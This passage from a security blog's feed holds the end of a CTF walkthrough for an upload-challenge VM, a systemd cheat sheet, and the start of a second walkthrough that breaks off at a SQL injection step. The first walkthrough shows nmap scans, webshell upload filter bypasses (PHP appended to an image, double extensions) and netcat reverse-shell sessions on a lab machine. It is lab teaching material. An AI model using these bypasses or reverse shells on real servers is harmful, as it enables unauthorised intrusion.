&lt;p&gt;This machine will probably test your web app skills once again. There are 3 different pages that should be focused on (you will see!) If you solve one or all three pages, please send me an email and quick write up on how you solved each challenge. Your goal is to successfully upload a webshell or malicious file to the server. If you can execute system commands on this box, thats good enough!!! I hope you have fun!&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 10.0.1.110&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd 2.4.7 ((Ubuntu))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Enumeration of port 80, discovered &lt;code&gt;login.php&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/dirbuster.png&quot; alt=&quot;dirbuster&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;level-1&quot;&gt;Level 1&lt;/h2&gt;

&lt;p&gt;The web application has no filter protection, so uploading a PHP shell is possible.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/uploader1.png&quot; alt=&quot;uploader1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;PHP Shell Upload:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/file-upload.png&quot; alt=&quot;php shell upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The location &lt;code&gt;/uploads2&lt;/code&gt; was previously disclosed by &lt;strong&gt;Dirbuster&lt;/strong&gt;, &lt;code&gt;/uploads1&lt;/code&gt; was discovered manually (logical guess).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/uploads1.png&quot; alt=&quot;php shell execution&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Reverse shell:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443                               
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.110] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.111] 33115
Linux zorz 3.13.0-45-generic &lt;span class=&quot;c&quot;&gt;#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux&lt;/span&gt;
 16:21:31 up 1 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Level 1 complete.&lt;/p&gt;

&lt;h2 id=&quot;level-2&quot;&gt;Level 2&lt;/h2&gt;

&lt;p&gt;The initial attempt to upload the previous shell failed with the error message:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/upload2-fail.png&quot; alt=&quot;php shell upload fail&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Several attempts were then made to upload shells with various extensions such as &lt;code&gt;shell.png.php&lt;/code&gt; , &lt;code&gt;shell.php.png&lt;/code&gt; etc to bypass the web application filtering, all attempts to bypassed the filtering failed.&lt;/p&gt;

&lt;h3 id=&quot;burp-suite---php-shell-injection-in-an-image-file&quot;&gt;Burp Suite - PHP Shell Injection in an Image file&lt;/h3&gt;

&lt;p&gt;It was apparent the web application had a mechanism for image file validation, several attempts were made to inject the php shell code into the image file. The solution was to inject the code at the end of the image data.&lt;/p&gt;

&lt;p&gt;The file extension also needed modifying to &lt;code&gt;.php.jpg&lt;/code&gt;, this appeared to force the web server to process the file, likely due to poorly configured Apache MIME types.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/burp-php-shell-injection-in-an-image.png&quot; alt=&quot;Burp Suite shell injection in an image&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Image uploaded successfully.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/uploaded-shell.png&quot; alt=&quot;Shell Upload&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Execution of image from &lt;code&gt;/uploads2&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/dir.png&quot; alt=&quot;upload dir&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell:&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root:~]# nc &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 443
listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.110] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.111] 33118
Linux zorz 3.13.0-45-generic &lt;span class=&quot;c&quot;&gt;#74-Ubuntu SMP Tue Jan 13 19:37:48 UTC 2015 i686 i686 i686 GNU/Linux&lt;/span&gt;
 17:02:32 up 42 min,  0 &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;,  load average: 0.00, 0.01, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
/bin/sh: 0: can&lt;span class=&quot;s1&quot;&gt;'t access tty; job control turned off
$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Level 2 complete.&lt;/p&gt;

&lt;h2 id=&quot;level-3&quot;&gt;Level 3&lt;/h2&gt;

&lt;p&gt;Level 3 was beaten simply by renaming the php reverse shell to &lt;code&gt;php-reverse-shell.php.png&lt;/code&gt;, this was enough to bypass the filtering.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/zorz/level3.png&quot; alt=&quot;Level 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An alternative solution would of been to use burp to upload the file + change the content type.&lt;/p&gt;

&lt;h2 id=&quot;flag&quot;&gt;Flag&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;l337saucel337
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
&lt;/span&gt;SECRETFILE
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;SE
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: SE: No such file or directory
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;SECRETFILE
Great job so far. This box has 3 uploaders.

The first 2 are pure php, the last one is php w/jquery.

To get credit &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;this challenge, please submit a write-up or instructions
on how you compromised the uploader or uploaders. If you solve 1, 2, or all
of the uploader challenges, feel free to shoot me an email and &lt;span class=&quot;nb&quot;&gt;let &lt;/span&gt;me know!

Thanks &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;playing!
http://www.top-hat-sec.com
&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Level 3 complete.&lt;/p&gt;

&lt;p&gt;Thanks for the VM :)&lt;/p&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Systemd Cheat Sheet</title>
          <link>https://highon.coffee/blog/systemd-cheat-sheet/</link>
          <pubDate>Mon, 29 Jun 2015 11:35:10 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>linux-enum</category>
          
          <category>RHEL</category>
          
          <category>CentOS</category>
          
          
          <category>cheat-sheet</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/systemd-cheat-sheet/</guid>
          <description>&lt;p&gt;Systemd is now the default in RHEL / CentOS 7, the following post is a cheat
sheet for systemd commands, useful for local system enumeration.&lt;/p&gt;

&lt;div class=&quot;note tip&quot;&gt;
  &lt;h5&gt;Systemd is becoming the default on most distros&lt;/h5&gt;
  &lt;p&gt;Systemd is becoming the default in many distros, &lt;b&gt;RHEL, CentOS, Ubuntu 15&lt;/b&gt;
  and it offers a single command to manage your system, instead of switching
  between &lt;code&gt;chkconfig&lt;/code&gt; or running init scripts.&lt;/p&gt;
&lt;/div&gt;

&lt;h2 id=&quot;systemd-service-commands&quot;&gt;Systemd Service Commands&lt;/h2&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl stop service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemd stop running service&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl start service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl start service&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl restart service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemd restart running service&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl reload service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;reloads all config files for service&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl status service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl show if service is running&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl enable service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;systemctl start service at boot&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctrl disable service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;systemctl - disable service at boot&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl show service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;show systemctl service info&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl -H target command service-name&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
           &lt;p&gt;run systemctl commands remotely&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;systemd-information-commands&quot;&gt;Systemd Information Commands&lt;/h2&gt;

&lt;p&gt;Systemd commands that show useful system information.&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl list-dependencies&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;show and units dependencies&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl list-sockets&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemd list sockets and activities&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl list-jobs&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;view active systemd jobs&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl list-unit-files&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl list unit files and their states&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl list-units&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl list default target (like run level)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;h2 id=&quot;changing-system-state&quot;&gt;Changing System State&lt;/h2&gt;

&lt;p&gt;systemd reboot, shutdown, default target etc&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl reboot&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl reboot the system&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl poweroff&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl shutdown (power off the system)&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl emergency&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;Put in emergency mode&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;systemctl default&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;systemctl default mode&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;p&gt;##Systemctl Viewing Log Messages&lt;/p&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Command&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
      &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;journalctl&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;show all collected log messages&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

     &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;journalctl -u sshd.service&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;see sshd service messages&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;journelctl -f&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;follow messages as they appear&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;
        &lt;p&gt;&lt;code&gt;journelctl -k&lt;/code&gt;&lt;/p&gt;
      &lt;/td&gt;
      &lt;td&gt;
            &lt;p&gt;show kernel messages only&lt;/p&gt;
      &lt;/td&gt;
    &lt;/tr&gt;

      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
</description>
        </item>
        
      
    
      
        
        <item>
          <title>Freshly Walkthrough</title>
          <link>https://highon.coffee/blog/freshly-walkthrough/</link>
          <pubDate>Sun, 14 Jun 2015 00:00:00 +0000</pubDate>
          <dc:creator>Arr0way</dc:creator>
          
          <category>CTF</category>
          
          
          <category>walkthroughs</category>
          
          <guid isPermaLink="true">https://highon.coffee/blog/freshly-walkthrough/</guid>
          <description>&lt;div class=&quot;coffee-rating&quot;&gt;
&lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;code&gt;Coffee Difficulty Rating:&lt;/code&gt;&lt;/p&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;p&gt;&lt;i class=&quot;fa fa-coffee&quot;&gt;&lt;/i&gt;&lt;/p&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;

&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#author-description&quot; id=&quot;markdown-toc-author-description&quot;&gt;Author Description&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#port-scanning&quot; id=&quot;markdown-toc-port-scanning&quot;&gt;Port Scanning&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#service-enumeration&quot; id=&quot;markdown-toc-service-enumeration&quot;&gt;Service Enumeration&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#http-enumeration&quot; id=&quot;markdown-toc-http-enumeration&quot;&gt;HTTP Enumeration&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sql-injection&quot; id=&quot;markdown-toc-sql-injection&quot;&gt;SQL Injection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#wordpress---reverse-php-shell&quot; id=&quot;markdown-toc-wordpress---reverse-php-shell&quot;&gt;Wordpress - Reverse PHP Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege Escalation&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#post-exploitation-enumeration&quot; id=&quot;markdown-toc-post-exploitation-enumeration&quot;&gt;Post Exploitation Enumeration&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;author-description&quot;&gt;Author Description&lt;/h2&gt;

&lt;p&gt;The goal of this challenge is to break into the machine via the web and find the secret hidden in a sensitive file. If you can find the secret, send me an email for verification.&lt;/p&gt;

&lt;h3 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1-65535 &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sT&lt;/span&gt; 10.0.1.109&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;service-enumeration&quot;&gt;Service Enumeration&lt;/h3&gt;

&lt;div class=&quot;mobile-side-scroller&quot;&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Version Detection&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 80&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;64 Apache httpd 2.4.7 ((Ubuntu))&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 443&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTPS&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;

        &lt;tr&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;&lt;code&gt;TCP: 8080&lt;/code&gt;&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;HTTP&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
           &lt;td&gt;
               &lt;pc&gt;&lt;p&gt;Apache httpd&lt;/p&gt;&lt;/pc&gt;
           &lt;/td&gt;
        &lt;/tr&gt;
        &lt;/tbody&gt;

&lt;/table&gt;
&lt;/div&gt;

&lt;h3 id=&quot;http-enumeration&quot;&gt;HTTP Enumeration&lt;/h3&gt;

&lt;p&gt;Enumeration of port 80, discovered &lt;code&gt;login.php&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/freshly/dirbuster.png&quot; alt=&quot;dirbuster&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/blog/freshly/login.png&quot; alt=&quot;login form sqli&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection&lt;/h2&gt;

&lt;p&gt;The discovered form was vulnerable to a time-based SQL injection, SQLMap was used to expose the following databases:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;available databases &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;7]:
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; information_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; login
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; mysql
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; performance_schema
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; phpmyadmin
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; wordpress8080&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;SQLMap was used to dump the &lt;strong&gt;wordpress8080&lt;/strong&gt; database:&lt;/p&gt;

